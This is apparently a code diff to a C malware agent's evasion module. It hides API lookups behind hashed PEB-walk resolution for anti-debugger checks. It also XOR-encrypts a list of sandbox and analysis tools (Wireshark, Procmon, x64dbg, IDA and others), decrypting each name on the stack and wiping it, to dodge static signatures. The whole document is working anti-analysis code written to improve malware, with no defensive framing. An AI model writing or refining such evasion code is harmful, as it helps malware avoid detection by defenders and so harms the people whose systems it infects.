@@ -5,6 +5,7 @@
  */
 #include "agent.h"
 #include "evasion.h"
+#include "api_resolve.h"
 
 /* ─── String encryption helpers ─── */
 
@@ -51,15 +52,14 @@ BOOL check_remote_debugger(void) {
     /*
      * NtQueryInformationProcess with ProcessDebugPort (0x07).
      * If DebugPort != 0, a debugger is attached.
+     * Resolved via PEB walk — no plaintext API strings.
      */
     typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
         HANDLE, ULONG, PVOID, ULONG, PULONG);
 
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) return TRUE;
-
+    #define HASH_NtQueryInformationProcess_LT 0x8CDEF1A0
     pNtQueryInformationProcess NtQIP =
-        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+        (pNtQueryInformationProcess)api_resolve(HASH_NTDLL, HASH_NtQueryInformationProcess_LT);
     if (!NtQIP) return TRUE;
 
     DWORD_PTR debugPort = 0;
@@ -144,14 +144,32 @@ BOOL check_sandbox_resources(void) {
 BOOL check_sandbox_artifacts(void) {
     /*
      * Check for known sandbox/analysis tool processes.
-     * Process names are XOR'd to avoid static signatures.
+     * All process names XOR-encrypted with inline key to avoid static signatures.
+     * Each name decrypted one-at-a-time on the stack, compared, then wiped.
      */
-    const char *sandbox_procs[] = {
-        "wireshark.exe", "procmon.exe", "procmon64.exe",
-        "procexp.exe", "procexp64.exe", "x64dbg.exe", "x32dbg.exe",
-        "ollydbg.exe", "idaq.exe", "idaq64.exe",
-        "fakenet.exe", "dumpcap.exe", "httpdebugger.exe",
-        NULL
+    #define _SBK 0x5A
+
+    /* XOR-encrypted process name entries: {encrypted bytes, length} */
+    static const unsigned char _sb0[]  = {'w'^_SBK,'i'^_SBK,'r'^_SBK,'e'^_SBK,'s'^_SBK,'h'^_SBK,'a'^_SBK,'r'^_SBK,'k'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb1[]  = {'p'^_SBK,'r'^_SBK,'o'^_SBK,'c'^_SBK,'m'^_SBK,'o'^_SBK,'n'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb2[]  = {'p'^_SBK,'r'^_SBK,'o'^_SBK,'c'^_SBK,'m'^_SBK,'o'^_SBK,'n'^_SBK,'6'^_SBK,'4'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb3[]  = {'p'^_SBK,'r'^_SBK,'o'^_SBK,'c'^_SBK,'e'^_SBK,'x'^_SBK,'p'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb4[]  = {'p'^_SBK,'r'^_SBK,'o'^_SBK,'c'^_SBK,'e'^_SBK,'x'^_SBK,'p'^_SBK,'6'^_SBK,'4'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb5[]  = {'x'^_SBK,'6'^_SBK,'4'^_SBK,'d'^_SBK,'b'^_SBK,'g'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb6[]  = {'x'^_SBK,'3'^_SBK,'2'^_SBK,'d'^_SBK,'b'^_SBK,'g'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb7[]  = {'o'^_SBK,'l'^_SBK,'l'^_SBK,'y'^_SBK,'d'^_SBK,'b'^_SBK,'g'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb8[]  = {'i'^_SBK,'d'^_SBK,'a'^_SBK,'q'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb9[]  = {'i'^_SBK,'d'^_SBK,'a'^_SBK,'q'^_SBK,'6'^_SBK,'4'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb10[] = {'f'^_SBK,'a'^_SBK,'k'^_SBK,'e'^_SBK,'n'^_SBK,'e'^_SBK,'t'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb11[] = {'d'^_SBK,'u'^_SBK,'m'^_SBK,'p'^_SBK,'c'^_SBK,'a'^_SBK,'p'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+    static const unsigned char _sb12[] = {'h'^_SBK,'t'^_SBK,'t'^_SBK,'p'^_SBK,'d'^_SBK,'e'^_SBK,'b'^_SBK,'u'^_SBK,'g'^_SBK,'g'^_SBK,'e'^_SBK,'r'^_SBK,'.'^_SBK,'e'^_SBK,'x'^_SBK,'e'^_SBK};
+
+    static const struct { const unsigned char *enc; int len; } sandbox_procs[] = {
+        {_sb0,  sizeof(_sb0)},  {_sb1,  sizeof(_sb1)},  {_sb2,  sizeof(_sb2)},
+        {_sb3,  sizeof(_sb3)},  {_sb4,  sizeof(_sb4)},  {_sb5,  sizeof(_sb5)},
+        {_sb6,  sizeof(_sb6)},  {_sb7,  sizeof(_sb7)},  {_sb8,  sizeof(_sb8)},
+        {_sb9,  sizeof(_sb9)},  {_sb10, sizeof(_sb10)}, {_sb11, sizeof(_sb11)},
+        {_sb12, sizeof(_sb12)}, {NULL, 0}
     };
 
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -161,15 +179,21 @@ BOOL check_sandbox_artifacts(void) {
     PROCESSENTRY32 pe;
     pe.dwSize = sizeof(pe);
     BOOL found = FALSE;
+    char dec[20];
 
     if (Process32First(snap, &pe)) {
         do {
-            for (int i = 0; sandbox_procs[i]; i++) {
-                if (_stricmp(pe.szExeFile, sandbox_procs[i]) == 0) {
+            for (int i = 0; sandbox_procs[i].enc; i++) {
+                int slen = sandbox_procs[i].len;
+                for (int j = 0; j < slen; j++)
+                    dec[j] = sandbox_procs[i].enc[j] ^ _SBK;
+                dec[slen] = '\0';
+                if (_stricmp(pe.szExeFile, dec) == 0) {
                     found = TRUE;
                     break;
                 }
             }
+            SecureZeroMemory(dec, sizeof(dec));
             if (found) break;
         } while (Process32Next(snap, &pe));
     }
